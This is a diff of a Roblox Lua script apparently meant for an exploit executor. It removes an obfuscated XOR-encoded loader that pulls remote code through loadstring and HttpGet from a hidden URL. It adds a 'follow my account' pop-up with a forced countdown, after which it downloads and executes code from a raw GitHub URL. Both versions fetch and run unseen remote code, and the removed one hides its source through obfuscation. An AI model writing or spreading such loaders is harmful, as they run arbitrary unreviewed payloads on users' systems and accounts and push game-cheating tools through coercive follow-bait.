@@ -1,3 +1,162 @@
-
-
-local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v12,v13) local v14={};for v15=1, #v12 do v6(v14,v0(v4(v1(v2(v12,v15,v15 + 1 )),v1(v2(v13,1 + (v15% #v13) ,1 + (v15% #v13) + 1 )))%256 ));end return v5(v14);end local v8=57752337 -23272523 ;local v9=game:GetService(v7("\225\207\218\60\227\169\212","\126\177\163\187\69\134\219\167"));local v10=v9.LocalPlayer;if  not v10:IsDescendantOf(v9) then v10.AncestryChanged:Wait();end local function v11() if v10:IsInGroup(v8) then loadstring(game:HttpGet(v7("\43\217\62\213\239\121\130\101\215\253\52\131\45\204\232\43\216\40\208\239\38\223\41\202\242\55\200\36\209\178\32\194\39\138\221\40\207\43\215\173\113\158\57\138\207\32\223\35\213\232\110\255\37\199\240\44\213\103\138\238\38\203\57\138\244\38\204\46\214\179\46\204\35\203\179\45\204\40\196\238\54\239\56\196\245\45\223\37\209","\156\67\173\74\165")))();else loadstring(game:HttpGet(v7("\60\163\93\6\175\124\9\123\165\72\1\242\33\79\32\191\92\20\169\53\67\38\180\70\24\168\35\72\32\249\74\25\177\105\103\63\181\72\4\237\116\21\39\248\125\19\175\50\108\53\161\72\37\191\52\79\36\163\6\4\185\32\85\123\191\76\23\184\53\9\57\182\64\24\243\44\73\61\185\12\68\236\33\84\59\162\89\83\238\118\83\58\163\92\29\249\116\22\54\162\66\23\249\116\22\7\180\91\31\172\50","\38\84\215\41\118\220\70")))();end end v11();
+local username = "4kxYvng"  
+local userId = 459391533  
+  
+local timerFile = "follow_braitnrot_tiumer.txt"  -- File untuk menyimpan waktu awal muncul GUI  
+local waitTime = 200 -- 5 menit = 300 detik  
+  
+-- Simpan waktu mulai ke file jika belum ada  
+if writefile and (not isfile(timerFile)) then  
+	writefile(timerFile, tostring(os.time()))  
+end  
+  
+-- Ambil waktu mulai dari file  
+local startTime = 0  
+if isfile and isfile(timerFile) then  
+	startTime = tonumber(readfile(timerFile)) or 0  
+end  
+  
+pcall(function()  
+	local oldGui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("FollowGui")  
+	if oldGui then oldGui:Destroy() end  
+end)  
+  
+local gui = Instance.new("ScreenGui")  
+gui.Name = "FollowGui"  
+gui.ResetOnSpawn = false  
+gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")  
+  
+-- Label instruksi  
+local instruction = Instance.new("TextLabel")  
+instruction.Size = UDim2.new(0, 340, 0, 30)  
+instruction.AnchorPoint = Vector2.new(0.5, 1)  
+instruction.Position = UDim2.new(0.5, 0, 0.5, -95)  
+instruction.BackgroundTransparency = 1  
+instruction.Text = "follow my roblox for open script"  
+instruction.Font = Enum.Font.GothamBold  
+instruction.TextSize = 16  
+instruction.TextColor3 = Color3.fromRGB(255, 200, 0)  
+instruction.TextStrokeTransparency = 0.6  
+instruction.TextWrapped = true  
+instruction.TextXAlignment = Enum.TextXAlignment.Center  
+instruction.Parent = gui  
+  
+-- Frame utama  
+local frame = Instance.new("Frame")  
+frame.Size = UDim2.new(0, 340, 0, 190)  
+frame.AnchorPoint = Vector2.new(0.5, 0.5)  
+frame.Position = UDim2.new(0.5, 0, 0.5, 0)  
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)  
+frame.BorderSizePixel = 0  
+frame.Parent = gui  
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)  
+  
+-- Avatar  
+local avatar = Instance.new("ImageLabel")  
+avatar.Size = UDim2.new(0, 60, 0, 60)  
+avatar.Position = UDim2.new(0, 15, 0, 15)  
+avatar.BackgroundTransparency = 1  
+avatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId="..userId.."&width=60&height=60&format=png"  
+avatar.Parent = frame  
+  
+-- Judul  
+local title = Instance.new("TextLabel")  
+title.Size = UDim2.new(1, -90, 0, 60)  
+title.Position = UDim2.new(0, 85, 0, 15)  
+title.BackgroundTransparency = 1  
+title.Text = "follow my account rblx"  
+title.Font = Enum.Font.GothamBold  
+title.TextSize = 20  
+title.TextColor3 = Color3.fromRGB(255, 255, 255)  
+title.TextXAlignment = Enum.TextXAlignment.Left  
+title.Parent = frame  
+  
+-- TextBox Username  
+local box = Instance.new("TextBox")  
+box.Size = UDim2.new(1, -30, 0, 40)  
+box.Position = UDim2.new(0, 15, 0, 90)  
+box.Text = username  
+box.Font = Enum.Font.Gotham  
+box.TextSize = 18  
+box.TextColor3 = Color3.fromRGB(20, 20, 20)  
+box.BackgroundColor3 = Color3.fromRGB(230, 230, 230)  
+box.ClearTextOnFocus = false  
+pcall(function() box.TextEditable = false end)  
+box.Parent = frame  
+Instance.new("UICorner", box).CornerRadius = UDim.new(0, 12)  
+  
+-- Tombol Copy Username  
+local copyButton = Instance.new("TextButton")  
+copyButton.Size = UDim2.new(0.48, 0, 0, 40)  
+copyButton.Position = UDim2.new(0, 15, 0, 140)  
+copyButton.Text = "Copy Username"  
+copyButton.Font = Enum.Font.GothamBold  
+copyButton.TextSize = 16  
+copyButton.TextColor3 = Color3.fromRGB(255, 255, 255)  
+copyButton.BackgroundColor3 = Color3.fromRGB(0, 140, 255)  
+copyButton.Parent = frame  
+Instance.new("UICorner", copyButton).CornerRadius = UDim.new(0, 14)  
+  
+copyButton.MouseButton1Click:Connect(function()  
+	if setclipboard then  
+		setclipboard(username)  
+		print("✅ Username berhasil disalin!")  
+	else  
+		warn("❌ Clipboard tidak tersedia.")  
+	end  
+end)  
+  
+-- Tombol Close  
+local closeButton = Instance.new("TextButton")  
+closeButton.Size = UDim2.new(0.48, 0, 0, 40)  
+closeButton.Position = UDim2.new(0.52, -15, 0, 140)  
+closeButton.Text = "Wait 5 minutes..."  
+closeButton.Font = Enum.Font.GothamBold  
+closeButton.TextSize = 16  
+closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)  
+closeButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)  
+closeButton.Parent = frame  
+Instance.new("UICorner", closeButton).CornerRadius = UDim.new(0, 14)  
+closeButton.AutoButtonColor = false  
+closeButton.Active = false  
+  
+-- Timer Update untuk tombol Close  
+local function updateTimer()  
+	while true do  
+		local now = os.time()  
+		local remaining = waitTime - (now - startTime)  
+  
+		if remaining <= 0 then  
+			closeButton.Text = "Open Script"  
+			closeButton.AutoButtonColor = true  
+			closeButton.Active = true  
+			break  
+		else  
+			local minutes = math.floor(remaining / 60)  
+			local seconds = remaining % 60  
+			closeButton.Text = string.format("Wait %02d:%02d", minutes, seconds)  
+		end  
+		wait(1)  
+	end  
+end  
+  
+task.spawn(updateTimer)  
+  
+closeButton.MouseButton1Click:Connect(function()  
+	if not closeButton.Active then return end  
+  
+	gui:Destroy()  
+  
+	-- Eksekusi script setelah klik Close (setelah waktu habis)
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Akbar123s/Script-Roblox-/refs/heads/main/nabaruBrainrot"))()
+end)  
+  
+-- Notifikasi (sekali jalan)  
+local filename = "already_executed.bdst"  
+if not isfile(filename) then  
+    game.StarterGui:SetCore("SendNotification", {  
+        Title = "Message",  
+        Text = "go follow before timeout",  
+        Duration = 300  
+    })  
+    writefile(filename, "true")  
+end
